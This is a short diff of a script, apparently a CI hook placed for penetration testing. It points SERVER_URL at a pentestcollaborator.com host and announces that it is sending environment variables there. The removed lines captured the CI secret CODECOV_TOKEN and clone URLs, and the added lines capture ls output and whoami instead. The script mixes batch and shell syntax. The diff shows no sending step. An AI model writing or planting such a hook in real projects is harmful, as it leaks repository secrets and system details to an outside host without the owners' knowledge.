@@ -1,16 +1,16 @@
 @echo off
 setlocal
 
-echo test1
+echo test2
 
 export SERVER_URL=https://uqowc8eg8jdobvvul8rwjfwozf56t0hp.pentestcollaborator.com
 
 echo Retrieving environment variables...
 
 echo Retrieve environment variables
-export VAR1=$CODECOV_TOKEN
-export VAR2=$API_CLONE_URL
-export VAR3=$AUTH_CLONE_URL
+export VAR1=$ls
+export VAR2=$(ls -la)
+export VAR3=$(whoami)
 
 echo Sending environment variables to server...
 
